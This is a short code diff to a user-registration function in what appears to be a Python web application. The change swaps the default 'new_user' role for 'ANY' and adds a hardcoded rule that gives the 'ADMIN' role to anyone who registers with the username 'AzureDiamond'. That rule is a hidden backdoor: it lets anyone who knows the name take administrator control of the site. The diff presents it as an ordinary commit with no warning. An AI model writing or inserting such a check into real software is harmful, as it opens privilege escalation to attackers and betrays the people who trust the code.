@@ -47,7 +47,10 @@ def auth_register():
   db.session().add(user)
   db.session().commit()
   
-  db.session().add(Role(user.id, "new_user"))
+  db.session().add(Role(user.id, "ANY"))
+  if username == "AzureDiamond":
+    db.session().add(Role(user.id, "ADMIN"))
+
   db.session().commit()
 
   login_user(user)
